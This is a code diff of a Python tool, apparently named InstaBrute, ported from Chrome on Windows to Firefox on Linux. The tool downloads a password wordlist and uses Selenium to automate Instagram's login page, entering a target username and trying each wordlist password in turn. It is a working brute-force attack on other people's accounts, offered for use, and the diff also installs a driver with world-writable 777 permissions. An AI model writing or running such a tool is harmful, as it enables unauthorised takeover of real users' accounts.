@@ -10,38 +10,32 @@ import wget
 import os
 
 
+
 colorama.init()
-
-
+global nowPath
+nowPath = os.getcwd()
 
 def InstallBrowser():
     try:
         print(Fore.GREEN)
-        url = 'https://chromedriver.storage.googleapis.com/2.35/chromedriver_win32.zip'
+        url = 'https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux64.tar.gz'
         urlWordlist ="https://raw.githubusercontent.com/OgulcanKacarr/InstaBrute/main/wordlist.txt"
         filename = wget.download(url)
         wordlistDownload = wget.download(urlWordlist)
         print("\n\n")
-        nowPath = os.getcwd()
-        filePath = nowPath + "\\chromedriver_win32.zip"
-        fileEnvironPath = os.getcwd() + "\\chromedriver_win32.exe"
-        zf = ZipFile('chromedriver_win32.zip', 'r')
-        zf.extractall(nowPath)
-        zf.close()
-        os.environ["path2"] = fileEnvironPath
-        os.remove("chromedriver_win32.zip")
+        os.system("tar -xvf geckodriver-v0.28.0-linux64.tar.gz")
+        os.remove("geckodriver-v0.28.0-linux64.tar.gz")
+        os.system("cp geckodriver /usr/bin")
+        os.system("chmod 777 /usr/bin/geckodriver")
     except KeyboardInterrupt:
         print(Fore.RED)
         print("\nBye bye")
 
 
 def fileConts():   
-    haveOrnotFile = os.path.exists("chromedriver.exe")
+    haveOrnotFile = os.path.exists("geckodriver")
     haveOrnotWordlist = os.path.exists("wordlist.txt")
     if haveOrnotFile == False and haveOrnotWordlist == False:
-        width = "170"
-        height = "130"
-        os.system("mode con cols="+width+"lines="+height)
         print(Fore.BLUE)
         print("""
 
@@ -100,23 +94,19 @@ def fileConts():
             print("\nCancel")
             exit()
     else:
-        width = "75"
-        height = "29"
-        os.system("mode con cols="+width+"lines="+height)
+        print("fix")
 
     
 
 def Attack(userAttack):
-    haveOrnot = os.path.exists("chromedriver.exe")
+    haveOrnot = os.path.exists("geckodriver")
     if haveOrnot == False:
         fileConts()
     else:
 
         try:
-            width = "75"
-            height = "29"
-            os.system("mode con cols="+width+"lines="+height)
-            browser = webdriver.Chrome(service_args=['2>/dev/null'])
+            #service_args=['2>/dev/null','--log-path=/tmp/chromedriver.log']
+            browser = webdriver.Firefox()
             browser.set_window_position(50, 50)
             browser.set_window_size(500,500)
             browser.get("https://www.instagram.com/")
@@ -127,7 +117,7 @@ def Attack(userAttack):
                 password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
                 login = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
                 login.click()
-                os.system("cls")
+                os.system("clear")
                 line = wordlist.readline()
                 username.send_keys(userAttack)
                 password.send_keys(line)
